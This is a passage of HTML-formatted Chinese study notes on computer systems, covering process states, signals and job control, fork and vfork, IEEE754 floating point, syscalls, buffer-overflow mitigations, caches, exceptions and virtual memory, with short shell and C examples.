title=\"double to unsigned long long\"></a>double to unsigned long long</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> a = (unsinged <span class=\"keyword\">long</span> <span class=\"keyword\">long</span>)(<span class=\"number\">2.0</span>); <span class=\"comment\">// a==2</span></span><br><span class=\"line\"><span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> a = (unsinged <span class=\"keyword\">long</span> <span class=\"keyword\">long</span>)(<span class=\"number\">-2.0</span>); <span class=\"comment\">// a==140735559226888</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>double to long long用的是特殊的指令</li>\n</ul>\n<h3 id=\"进程\"><a href=\"#进程\" class=\"headerlink\" title=\"进程\"></a>进程</h3><ul>\n<li>进程是内核定义的抽象实体，并为该实体分配可用以执行程序的各项系统资源</li>\n<li>提供一个假象：当前程序是OS中的唯一程序</li>\n<li>定义：一个执行中的程序的实例</li>\n<li>一个独立的逻辑控制流，一个私有的地址空间</li>\n<li>地址空间，从低到高是<ul>\n<li>x86-64从0x400000开始，x86-32从0x8048000开始，gcc的<code>-fPIE</code>(Position-independent executables)则会使得EP变成0x10a0，不清楚运行时是否会变</li>\n<li>只读代码段（.init, .rodata, .text）</li>\n<li>读/写段（.data, .bss），包含显式初始化的全局变量和静态变量，跟只读代码段一样都是从可执行文件中加载的</li>\n<li>运行时堆（堆顶由brk指示(brk，由内核维护，进程私有)，向上增长）</li>\n<li>共享库的内存映射区域（向上增长）</li>\n<li>用户栈（运行时创建，rsp是栈指针，向下增长）</li>\n<li>内核虚拟内存（依次为代码、数据、物理内存映射（大小等于DRAM的数目）、页表、task和mm结构、内核栈（内核在进程的上下文中执行代码时使用的栈），用户不可见）</li>\n</ul>\n</li>\n<li><p>进程的三种状态（从程序员的视角来看）</p>\n<ul>\n<li>运行</li>\n<li><p>停止，不会被调度，收到<code>SIGSTOP</code>、<code>SIGTSTP</code>、<code>SIGTTIN</code>，<code>SIGTTOU</code>信号时停止直到收到<code>SIGCONT</code></p>\n<ul>\n<li><code>SIGSTOP</code>：不是来自终端的停止信号，不能被捕获或忽略</li>\n<li><code>SIGTSTP</code>：来自终端的停止信号，键入<code>Ctrl+Z</code>会发送<code>SIGTSTP</code>给前台job的每个进程，默认是停止（挂起）前台job</li>\n<li><p><code>SIGTTIN</code></p>\n<blockquote>\n<p>Only the foreground job receives terminal input. <strong>It is not an error for a background job to try to read from the terminal, but the terminal driver detects this and sends a special signal to the background job: SIGTTIN.</strong> This signal normally stops the background job; <strong>by using the shell, we are notified of this event and can bring the job into the foreground so that it can read from the terminal</strong>. </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; $ cat &gt; /tmp/23 &amp;</span><br><span class=\"line\">&gt; [1] 7739</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&gt; $ </span><br><span class=\"line\">&gt; [1]  + 7739 suspended (tty input)  bat &gt; /tmp/23</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">&gt; $ fg</span><br><span class=\"line\">&gt; [1]  + 7739 continued  bat &gt; /tmp/23</span><br><span class=\"line\">&gt; testMsg</span><br><span class=\"line\">&gt; ^C</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">&gt; $ /bin/cat /tmp/23 </span><br><span class=\"line\">&gt; testMsg</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n</li>\n<li><p><code>SIGTTOU</code></p>\n<blockquote>\n<p>When we disallow background jobs from writing to the controlling terminal, cat will block when it tries to write to its standard output, because the terminal driver identifies the write as coming from a background process and sends the job the SIGTTOU signal. As with the previous example, when we use the shell’s fg command to bring the job into the foreground, the job completes.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; $ /bin/cat /tmp/23 &amp;</span><br><span class=\"line\">&gt; [1] 8398</span><br><span class=\"line\">&gt; testMsg                                                                                                                                                  &gt;      </span><br><span class=\"line\">&gt; [1]  + 8398 done       /bin/cat /tmp/23</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">&gt; $ fg</span><br><span class=\"line\">&gt; fg: no current job</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">&gt; $ stty tostop </span><br><span class=\"line\">&gt; </span><br><span class=\"line\">&gt; $ /bin/cat /tmp/23 &amp;</span><br><span class=\"line\">&gt; [1] 8412</span><br><span class=\"line\">&gt; [1]  + 8412 suspended (tty output)  /bin/cat /tmp/23                                                                                             </span><br><span class=\"line\">&gt; </span><br><span class=\"line\">&gt; $ fg</span><br><span class=\"line\">&gt; [1]  + 8412 continued  /bin/cat /tmp/23</span><br><span class=\"line\">&gt; testMsg</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n</li>\n</ul>\n</li>\n<li><p>终止，永久停止。三种原因：收到一个信号，该信号handler终止该进程，从主程序返回，调用exit函数（exit函数不返回）（可以通过<code>exit(status)</code>终止进程并返回status，也可以通过<code>return status</code>终止进程并返回status）</p>\n</li>\n</ul>\n</li>\n<li><p>进程的状态</p>\n<ul>\n<li>来自<em>linux内核设计与实现</em></li>\n<li><code>TASK_RUNNING</code>：进程是可执行的，可能正在执行，或在运行队列中等待执行。这是进程在用户空间中执行的唯一可能状态。内核空间中正在执行的进程也是这种状态</li>\n<li><code>TASK_INTERRUPTIBLE</code>：进程正在睡眠（也就是被阻塞），到达某些条件达成，一旦条件达成，内核就会把进程状态设置为RUNNING。处于此状态的进程会因为接收到信号而提前被唤醒并随时准备投入运行</li>\n<li><code>TASK_UNINTERRUPTIBLE</code>：与<code>TASK_INTERRUPTIBLE</code>的差别在于，就算接受到信号也不会被唤醒（即使是SIGKILL信号）或准备投入运行。通常在进程必须在等待时不受干扰或等待的事件很快就会发生时出现（比如这个任务正在进行重要的操作，甚至可能持有一个信号量）。因为不对信号做响应，所以较之可中断的状态，用的较少。（ps中看到的<code>D</code>状态的进程就是这种状态）</li>\n<li><code>__TASK_TRACED</code>：被其他进程跟踪的进程，比如通过ptrace对调试程序进行跟踪</li>\n<li><code>__TASK_STOPPED</code>：进程停止执行，没有投入运行也不能投入运行。发生在接受到<code>SIGSTOP</code>，<code>SIGTSTP</code>，<code>SIGTTIN</code>，<code>SIGTTOU</code>信号时，调试期间受到任何信号也会使得进程进入这状态</li>\n<li>转换图见书P24(41)</li>\n<li>Ref: ps manual <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">the state of a process:</span><br><span class=\"line\">        D    uninterruptible sleep (usually IO)</span><br><span class=\"line\">        I    Idle kernel thread</span><br><span class=\"line\">        R    running or runnable (on run queue)</span><br><span class=\"line\">        S    interruptible sleep (waiting for an event to complete)</span><br><span class=\"line\">        T    stopped by job control signal</span><br><span class=\"line\">        t    stopped by debugger during the tracing</span><br><span class=\"line\">        W    paging (not valid since the 2.6.xx kernel)</span><br><span class=\"line\">        X    dead (should never be seen)</span><br><span class=\"line\">        Z    defunct (&quot;zombie&quot;) process, terminated but not reaped by its parent</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n<li><p>子进程终止了，需要父进程回收，父进程终止时，子进程没有终止（可以是僵尸进程），则init（pid=1，不终止）为子进程的养父</p>\n</li>\n</ul>\n<h4 id=\"作业（job）和进程组\"><a href=\"#作业（job）和进程组\" class=\"headerlink\" title=\"作业（job）和进程组\"></a>作业（job）和进程组</h4><ul>\n<li>unix shell使用job表示为对一条命令行求值而创建的进程</li>\n<li>任何时刻，至多只有一个前台作业和0或多个后台作业</li>\n<li>例子：<code>ls | sort</code>会创建一个由两个进程组成的前台作业，两个进程通过unix管道连接起来</li>\n</ul>\n<h4 id=\"进程组\"><a href=\"#进程组\" class=\"headerlink\" title=\"进程组\"></a>进程组</h4><ul>\n<li>shell为每个job创建一个独立的进程组</li>\n<li>进程组ID通常取自job中父进程中的一个</li>\n</ul>\n<h4 id=\"daemon\"><a href=\"#daemon\" class=\"headerlink\" title=\"daemon\"></a>daemon</h4><ul>\n<li>生命周期长，通常在系统启动时就被创建并一直运行到系统关闭</li>\n<li>在后台运行并且不拥有任何控制终端，这确保了内核永远不会为daemon自动生成任何任务控制信号以及终端相关的信号</li>\n<li>通常以<code>d</code>作为程序名称的后缀</li>\n<li>特定的daemon会作为内核线程运行，此类的daemon的代码是内核的一部分，通常在系统启动时被创建，ps列出的线程中，这些daemon会用<code>[]</code>括起来</li>\n<li>很多标准的daemon是通过系统关闭时执行特定于应用程序的脚本来关闭的，不以这种方式关闭的daemon会收到<code>SIGTERM</code>信号，因为系统关闭时，init进程会向所有其子进程发送这个信号，默认SIGTERM会终止一个进程，可以为这个信号建立处理器。init在发出SIGTERM信号5s后会发送SIGKILL信号</li>\n<li>创建daemon过程，见TLPI 37.2</li>\n</ul>\n<h4 id=\"创建新进程\"><a href=\"#创建新进程\" class=\"headerlink\" title=\"创建新进程\"></a>创建新进程</h4><ul>\n<li>fork后，子进程通过execve调用启动加载器</li>\n<li>加载器删除子进程现有的虚拟内存段，并创建一组新的代码、数据、堆、栈段</li>\n<li>loader跳转到<code>_start</code>地址，最终会调用main函数</li>\n<li>除了一些头部信息，加载过程中没有从磁盘到内存的数据复制，直到被引用时，OS才会使用页面调度机制自动将页面从磁盘传送到内存</li>\n<li>fork<ul>\n<li>子进程与父进程的用户级虚拟地址空间相同的（互相独立）的一份副本，包括代码和数据段、堆、共享库、用户栈</li>\n<li>相同的描述符表（所以可以读写父进程打开的任何文件）</li>\n<li>最大的区别是有不同的PID</li>\n<li>父进程返回子进程的pid，子进程返回0（pid总是非零）</li>\n</ul>\n</li>\n<li>vfork<ul>\n<li>在SUSv3已经标记为过时的，SUSv4则从规范中剔除了，CopyOnWrite的fork已经足够快了，并且有些OS还把vfork实现为fork</li>\n<li>无需为子进程复制虚拟内存或页表，共享父进程的内存，直到成功执行<code>exec</code>或<code>_exit</code>（不是<code>exit</code>）</li>\n<li>子进程执行<code>exec</code>或<code>_exit</code>之前，暂停执行父进程</li>\n<li>子进程不应该调用<code>exit</code>退出，因为其会导致父进程stdio的缓冲区刷新和关闭（更详细的见TLPI 25.4）</li>\n<li>保证子进程先于父进程获得调度获得CPU（fork无法保证这点）</li>\n<li>系统是在内核空间为每个进程维护文件描述符表的，且在vfork调用期间复制该表，所以子进程对文件描述符表的操作不会影响到父进程（对stdio的操作会，然而虽然文件描述符表是不同的，但是打开文件表不是相同的吗，操作后不就改变了文件位置了吗）</li>\n<li>SUSv3指出，以下行为是未定义的<ul>\n<li>修改了出用于存储vfork返回值的<code>pid_t</code>变量之外的任何数据</li>\n<li>从调用vfork的函数返回（我认为，应该是因为会影响栈）</li>\n<li>在成功地调用<code>_exit</code>或执行了<code>exec</code>之前，调用了任何其他函数</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"IEEE754\"><a href=\"#IEEE754\" class=\"headerlink\" title=\"IEEE754\"></a>IEEE754</h3><ul>\n<li>最高比特为sign（0为正，1为负），接下来的8bit（float32是8it，double64是11bit）是exp，剩下的是significand（尾数）</li>\n<li>规格化：<code>0&lt;exp&lt;255(2047)</code>，此时exp的含义是<code>exp-127(1023)</code>，尾数部分是<code>1.M</code>，<code>M</code>为尾数部分的二进制表达的数值。</li>\n<li>非规格化：<code>exp=0</code>，此时exp的含义是<code>exp=-126(-1022)</code>，尾数部分是<code>0.M</code>，要就是没有前缀<code>1</code>，从而，从<code>exp=1</code>到<code>exp=0</code>是平滑的过渡——exp没有变，然后对应的从<code>1.111111....</code>到<code>1</code>到<code>0.11111111111....</code>到<code>0</code>。其用于表示0和非常接近0的数，可能的数值均匀的接近于<code>0.0</code></li>\n<li>无穷大：<code>exp=255(2047)</code>，尾数是全0</li>\n<li>NaN：<code>exp=255(2047)</code>，尾数非0</li>\n<li>浮点数加法不具有结合律和分配率，有交换律</li>\n<li>$1/+0=+\\infin$，$1/-0=-\\infin$</li>\n</ul>\n<h3 id=\"汇编\"><a href=\"#汇编\" class=\"headerlink\" title=\"汇编\"></a>汇编</h3><ul>\n<li>参数寄存器：<code>rdi</code>, <code>rsi</code>, <code>rdx</code>, <code>rcx</code>, <code>r8</code>, <code>r9</code></li>\n<li>返回值：<code>rax</code></li>\n<li>栈指针：<code>rsp</code></li>\n<li>对抗缓冲区溢出攻击<ul>\n<li>ASLR(Address space layout randomization)（每次运行，程序代码、库代码、栈、全局变量、堆在内存的不同区域）</li>\n<li>栈破坏检测（金丝雀值，栈帧中任何局部缓冲区和栈状态之间存一个特殊的金丝雀值）</li>\n<li>限制可执行代码的区域（一些内存页上的东西不允许执行）</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"数据对齐\"><a href=\"#数据对齐\" class=\"headerlink\" title=\"数据对齐\"></a>数据对齐</h3><ul>\n<li>计算机系统对基本数据类型的合法地址做出一些限制</li>\n<li>对齐简化了处理器和内存系统之间的接口设计——比如，读一个8B东西读一次就行，不必读两次</li>\n<li>无论数据是否对齐，x86-64都可以正确工作，但是可以提高系统性能。另外，没有对其，SSE指令可能无法正确执行，AVX对于对齐么有强制性要求</li>\n<li>对于struct，为了使得结构内每个字段都对其，会有padding，结尾可能有padding，以满足结构数组内每个struct的对齐要求</li>\n<li>页表中，我们可以查询得到<code>PPN</code>（physical page number），但是<code>PPO</code>（物理页内位移）是低k位，这意味着，每个页需要$2^k$对齐，这样子才能使得<code>PPN</code>描述出该页的起始位置——因为我们都是拿到起始位置后加上offset（正数，也是虚拟地址的低k bit）获得target。PPO的12bit刚好与cache的页内偏移位数+组数目的bit数相同，所以可以直接使用PPO去索引相应的组和具体的word，然后等待PPN，与组内的那些tag来查找匹配</li>\n</ul>\n<h3 id=\"优化性能\"><a href=\"#优化性能\" class=\"headerlink\" title=\"优化性能\"></a>优化性能</h3><ul>\n<li>消除不必要的内存引用，使得可以编译器敢于缓存在寄存器中</li>\n<li>循环展开，一方面减少循环控制代码，另一方面可以有更大的优化空间</li>\n<li>提高并行性，比如进行累计运算时，使用多个acc变量，从而增加关键路径的数目，比如利用结合律，使得一些运算可以并行执行( $a<em>b</em>c<em>d \\rightarrow (a</em>b)<em>(c</em>d)$)，后者可以更快</li>\n<li>减少读写相关的代码：比如刚写完个一个cell，立刻就又要读了</li>\n</ul>\n<h3 id=\"存储\"><a href=\"#存储\" class=\"headerlink\" title=\"存储\"></a>存储</h3><ul>\n<li>磁盘寻道时，任意时刻读写头都位于同一柱面</li>\n<li>SSD的随机写性能较低，因为一个擦除过的块才可能被写</li>\n<li>局部性原理的体现：cache、虚拟内存每次加载一个页</li>\n<li>cache<ul>\n<li>全相联cache：只有一个组，电路必须并行的搜索许多tag，所以昂贵、难度大，只适合作为非常小的cache，比如TLB</li>\n<li>组相联：一个组有多路</li>\n<li>直接映射</li>\n<li>写：直写，每次都下一级cache，引起总线流量。写回，尽可能推迟更新下一级，但是要维护dirty bit。对于较长的传送时间，通常更倾向于写回而不是直写。</li>\n<li>写不命中：写分配，加载下一级的块上来，然后更新这个块。非写分配，直接写到下一级。直写cache通常是非写分配的，写会cache通常是写分配的。</li>\n<li>写、写不命中的细节随系统而变化</li>\n<li>每次加载、驱逐都是一行一行的来</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"动态共享库\"><a href=\"#动态共享库\" class=\"headerlink\" title=\"动态共享库\"></a>动态共享库</h3><ul>\n<li>好处<ul>\n<li>其text段在内存中只需要一份拷贝，可以被映射到不同进程的地址空间</li>\n<li>可以热更新服务器应用</li>\n<li>应用无需重新编译，只需要重新分发共享库即可</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"异常控制流\"><a href=\"#异常控制流\" class=\"headerlink\" title=\"异常控制流\"></a>异常控制流</h3><ul>\n<li>系统需要对系统状态的变化做出反应，这些状态不一定跟当前正在执行的进程有关。比如IO设备、定时器产生的信号</li>\n<li>可以发生在：硬件层（硬件的信号导致转移到异常处理程序）、OS层（比如上下文切换）、应用层（比如一个进程给另一个进程发送信号，从而接受者会突然转去执行信号处理程序，比如非本地跳转）</li>\n<li>ECF是计算机系统实现并发的基本机制，并发的例子有<ul>\n<li>中断应用程序执行的<strong>异常处理程序</strong></li>\n<li>中断应用程序执行的<strong>信号处理程序</strong></li>\n<li>在时间上重叠执行的进程和线程</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"异常\"><a href=\"#异常\" class=\"headerlink\" title=\"异常\"></a>异常</h4><ul>\n<li>这里的异常包括同步异常（trap、fault、abort）和异步异常（中断），有些厂商的手册中，异常只包括同步事件引起的控制流的改变</li>\n<li>异常是控制流中的突变，用来响应处理器状态中的某些变化</li>\n<li>异常号<ul>\n<li>每种类型的异常都分配了一个唯一的非负整数的异常号</li>\n<li>一些由处理器的设计者分配（比如被零除，缺页、内存访问违例、断点、算术运算溢出）</li>\n<li>其他由OS内核（OS内核：OS常驻内存的那部分）的设计者分配（比如syscall、来自外部IO设备的信号）</li>\n</ul>\n</li>\n<li>异常表<ul>\n<li>系统启动时（计算机重启或加电时）OS分配和初始化的一张跳转表</li>\n<li>条目<code>k</code>包含异常<code>k</code>的handler的地址</li>\n<li>异常表的起始地址放在一个叫做异常表基址寄存器的CPU寄存器中</li>\n</ul>\n</li>\n<li>过程<ul>\n<li>在运行时（OS执行某个程序时），处理器检测到发生一个事件（比如page fault、算数溢出、除零、系统定时器产生的信号、IO请求完成等），并确定对应的异常号<code>k</code></li>\n<li>随后处理器触发异常，方法是执行间接过程调用，通过异常表的表目<code>k</code>转到相应的handler</li>\n<li>处理完后可能会返回当前指令、返回给当前指令的下一条指令、终止被中断的程序</li>\n</ul>\n</li>\n<li><p>调用过程</p>\n<ul>\n<li>处理器将返回地址入栈，根据异常类型，返回地址可能是当前指令，可能是下一条指令。还需要入栈一些额外的信息，重新开始执行被中断的程序需要这些信息</li>\n<li>When control is being transferred from a user program to the kernel, all of these items are pushed onto the kernel’s stack rather than onto the user’s stack.(我猜，是不是如果是信号handler，则压入用户栈，否则内核栈)</li>\n<li>异常handler运行在内核模式</li>\n<li>硬件触发了异常后，剩下的工作都是软件的handler的。handler可以可选的执行“从中断返回”的指令，这将恢复现场并且切换为用户态（如果被中断的是一个用户程序的话），并将控制返回给被中断的程序</li>\n</ul>\n</li>\n<li><p>异常的类别</p>\n<ul>\n<li>中断：来自处理器外部的IO设备的信号的结果，异步，总是返回到下一条指令，其Handler常常称为中断处理程序<blockquote>\n<ul>\n<li>I/O interrupt from external device    </li>\n<li>Hittinng Ctrl-C at the keyboard    </li>\n<li>Arrival of a packet from    a network    </li>\n<li>Arrival of data from a disk    <ul>\n<li>过程举例<ul>\n<li>网络适配器，给处理器芯片的一个引脚发信号，并把中断号放在系统总线上，来触发中断，异常号标志了引起中断的设备</li>\n<li>当前指令完成后，处理器注意到中断引脚的电压变高了，就从总线读取中断号，并调用相应的Handler</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</blockquote>\n</li>\n<li>trap：有意的异常(syscall, breakpoint traps, special instructions)，同步，返回到下一条指令<ul>\n<li>syscall：用户执行<code>syscall n</code>，导致到一个异常处理程序的trap，这个handler解析参数，并调用适当的内核程序，<code>syscall</code>可以执行特权指令，并且可以访问内核中的栈</li>\n</ul>\n</li>\n<li>fault：潜在可恢复的异常（错误情况引起的，比如缺页异常），同步，可能返回到当前指令（否则，Handler返回到内核中的abort例程）。故障发生时，处理器将控制权转移到handler，如果handler可以处理这个错误情况，那么就将控制返回到引起故障的指令，从而重新执行它，否则返回到abort例程</li>\n<li>abort：不可恢复的异常（通常是一些硬件错误），同步，不返回</li>\n<li>异步异常是由处理器外部的IO设备中的事件产生的，不是由任何一条专门的指令造成的，同步异常是执行一条指令（这种指令叫做故障指令）的产物。（来自百度百科：<strong>异步</strong>双方不需要共同的时钟，也就是接收方不知道发送方什么时候发送）</li>\n</ul>\n</li>\n<li><p>一般保护故障（异常13），通常是因为一个程序引用了一个未定义的虚拟内存区域，或者是尝试写一个readOnly的text段，Linux shell把这个报告为Segment fault</p>\n</li>\n<li><p>linux的syscall</p>\n<ul>\n<li>每个syscall都有一个唯一的整数号，对应与一个到<strong>内核中的跳转表</strong>（这个<strong>跳转表不同于异常表</strong>）的偏移量</li>\n<li>所有到linux syscall的参数都是通过通用寄存器而不是栈传递的。rax包含syscall号</li>\n<li>C函数库的wrapper需要将参数复制到寄存器</li>\n<li>参数都是通过通用寄存器传递的，而不是通过栈传递的</li>\n<li>按照惯例，<code>rax</code>包含系统调用号，<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>r10</code>、<code>r8</code>、<code>r9</code>包含最多的6个参数，以上顺序也是参数的顺序（第一个在rdi，第二个在rsi以此类推）</li>\n<li>返回时，rcx、r11的内容会被破坏(应该就是caller save)，rax包含返回值，<code>-4095</code>到<code>-1</code>对应于负的errno</li>\n<li></li>\n<li>执行机器指令，引起处理器从用户态切换到内核态，并执行系统中断0x80的中断向量所指向的代码</li>\n<li>响应中断0x80，内核调用<code>system_call()</code>例程，在内核栈保存寄存器值，根据syscall编号索引服务例程的地址。服务例程执行必要任务时，可能会在用户内存和内核内存之间传送数据，完成后返回给<code>system_call</code>例程</li>\n<li>从内核栈中回复各寄存器的值，并将syscall的返回值放在栈上，返回wrapper，并切换到用户态</li>\n</ul>\n</li>\n<li><p>内核态 vs 用户态</p>\n<ul>\n<li>通常实现为，某个控制寄存器的一个mode bit来指示</li>\n<li>用户态不允许特权指令，比如停止处理器、改变mode bit、发起IO，不能引用地址空间中内核区内的代码和数据，否则会保护故障</li>\n<li>从用户态到内核态的唯一方法：通过诸如中断、故障、trap之类的异常。异常发生时，控制传递到处理程序，处理程序运行在内核模式</li>\n<li><code>/proc</code>可以让用户模式进程访问内核数据结构</li>\n<li>从2.6开始，<code>/sys</code>文件系统输出系统总线和设备的额外的底层信息</li>\n</ul>\n</li>\n<li><p>上下文切换</p>\n<ul>\n<li>一种较高层次的异常控制流，建立在前面讨论过的较低层次的异常机制之上，用来实现多任务 </li>\n<li>上下文：内核重新启动一个被抢占的进程所需的状态，通用目的寄存器、浮点寄存器、程序计数器、用户栈、状态寄存器、内核栈、各种内核数据结构（比如页表、包含有关当前进程信息的进程表、包含进程已打开文件的信息的文件表）</li>\n<li>步骤包括：保存当前进程的上下文，恢复某个被抢占的进程的上下文，将控制传递新恢复的进程</li>\n<li>syscall时，可能发生上下文切换，比如wait cond、read阻塞、sleep。即使syscall没有阻塞，内核也可以决定执行上下文切换</li>\n<li>看起来就像，OS利用三种同步的异常来借机上下文切换，如果没有，就借助定时器的中断</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"信号\"><a href=\"#信号\" class=\"headerlink\" title=\"信号\"></a>信号</h4><ul>\n<li>软件形式的异常，允许进程和内核中断其他进程</li>\n<li>底层硬件异常是由内核的Handler处理，对用户进程不可见，而信号就提供了一种机制来通知用户进程发生了这个异常（比如一个进程试图除以0，那么内核就会给它发<code>SIGFPE</code>信号）</li>\n<li>发送信号：内核通过更新目的进程的上下文中的某个状态来发送一个信号。两种原因：内核检测到一个系统事件，所以发信号、kill函数（一个进程调用kill函数，显式的要求内核给这个进程发信号，可以给自己发信号）</li>\n<li>目的进程被内核强迫以某种方式对信号做出反应时，就接受了信号。内核把进程从内核态切换到用户态时，会强制用户接受信号（如果有的话）</li>\n<li>一个发出但是还没有接收的信号叫做待处理信号</li>\n<li>一个类型最多只有一个待处理信号</li>\n<li>进程可以有选择的阻塞某类信号，如果进程收到被阻塞的信号，那么会把这个信号加入到等待集合中，之后解除锁定后，会随之传递给此进程</li>\n<li>每个进程都只属于一个进程组，父进程和子进程同属一个进程组，可以调用<code>setpgid</code>来改变</li>\n<li>键入<code>Ctrl+C</code>会导致内核发送一个SIGINT给前台进程组的每个进程，默认情况下结果是终止前台job</li>\n<li>键入<code>Ctrl+Z</code>会发送<code>SIGTSTP</code>给前台job的每个进程，默认是停止（挂起）前台job</li>\n<li>信号处理程序可以被其他信号处理程序（不是同一个信号的handler）中断</li>\n<li>阻塞信号<ul>\n<li>内核默认阻塞当前信号Handler正在处理的信号的那种类型的待处理信号</li>\n<li><code>sigprocmask</code>函数</li>\n</ul>\n</li>\n<li>编写信号handler的原则<ul>\n<li>handler要尽可能简单，比如只是设置一个flag</li>\n<li>handler里只能调用异步信号安全的函数（比如只访问局部变量的函数，比如不能被信号中断的函数）。异步信号安全不同于线程安全，线程安全中，对于非线程安全的函数的调用，可以通过持有同一把锁来实现线程安全；但是因为信号是异步的，所以如果在持有锁时信号到来，handler运行，则会死锁——因为handler调用该函数前也要持有锁，CSAPP 3rd（英文版）的P757有一个异步线程安全的函数的表，其中不包括exit、printf等常见函数</li>\n<li>保存和恢复errno。因为信号handler中调用的函数可能会在失败时设置errno，所以可能会干扰正常程序中的errno，所以需要在刚进入handler时保存errno，而在退出前恢复errno</li>\n<li>如果访问了全局的数据结构，那么需要阻塞所有信号</li>\n<li>使用volatile声明flag，volatile要求编译器每次在代码中引用flag时，都从内存中读取该值</li>\n<li>使用<code>sig_atomic_t</code>声明变量，对其读或写是原子的，不会中断，因为可以用一条指令来实现，所以不需要暂时的阻塞信号</li>\n</ul>\n</li>\n<li>信号不排队，所以接收到信号后要在循环中处理，而不能一个信号对应一次处理</li>\n<li><code>sigsuspend</code>可以用来显式的等待信号</li>\n<li>不对<code>SIGKILL</code>做响应的情况<ul>\n<li>首先，<code>SIGKILL</code>不能被捕获或者忽略（<code>SIGSTOP</code>也是）</li>\n<li>但是<code>TASK_UNINTERRUPTIBLE</code>的进程是不响应任何信号的，所以<code>SIGKILL</code>也无效</li>\n<li>僵尸进程无法被<code>SIGKILL</code>杀死，杀死僵尸进程的方法是其父进程终止或其父进程调用wait</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"虚拟内存\"><a href=\"#虚拟内存\" class=\"headerlink\" title=\"虚拟内存\"></a>虚拟内存</h3><h4 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h4><ul>\n<li>能力：使得可以把内存看作磁盘的cache；为进程提供一个一直的地址空间；保护进程的地址空间</li>\n<li>地址空间：一个非负整数地址的有序集合</li>\n<li>TLBI（TLB index）的索引是VPN（virtual page number）的低t bit索引的</li>\n<li>需要从cache、主存获得PTE是需要MMU计算PTEA的</li>\n<li>Linux中<strong>Swap</strong>（即：<strong>交换分区</strong>），类似于Windows的虚拟内存，就是当内存不足的时候，把一部分硬盘空间虚拟成内存使用,从而解决内存容量不足的情况。一旦一个虚拟页面被初始化（被按需页面调度进来，或者已经映射了二进制0页面（有对应的物理页）），则总是在swp space交换来交换去</li>\n</ul>\n<h4 id=\"计算物理地址的过程（不缺页版本）\"><a href=\"#计算物理地址的过程（不缺页版本）\" class=\"headerlink\" title=\"计算物理地址的过程（不缺页版本）\"></a>计算物理地址的过程（不缺页版本）</h4><ul>\n<li>处理器生成虚拟地址，并传递给MMU</li>\n<li>MMU生成PTE（页表条目）地址，并从高速缓存、主存请求得到它</li>\n<li>高速缓存、主存向MMU返回PTE</li>\n<li>MMU构造物理地址，并传递给高速缓存、主存</li>\n<li>高速缓存、主存返回所请求的数据字</li>\n</ul>\n<h4 id=\"计算物理地址的过程（缺页版本）\"><a href=\"#计算物理地址的过程（缺页版本）\" class=\"headerlink\" title=\"计算物理地址的过程（缺页版本）\"></a>计算物理地址的过程（缺页版本）</h4><ul>\n<li>处理器生成虚拟地址，并传递给MMU</li>\n<li>MMU生成PTE（页表条目）地址，并从高速缓存、主存请求得到它</li>\n<li>高速缓存、主存向MMU返回PTE</li>\n<li>PTE中的有效位是0，所以MMU触发一次异常，传递给CPU中的控制到OS内核的中的缺页处理程序</li>\n<li>缺页Handler确定中物理内存中的牺牲页，如果这个页面是dirty，则换出到磁盘</li>\n<li>缺页handler把页面调入主存并更新内存中PTE</li>\n<li>缺页handler返回原来的进程并再次执行导致缺页的指令</li>\n</ul>\n<h4 id=\"CopyOnWrite\"><a href=\"#CopyOnWrite\" class=\"headerlink\" 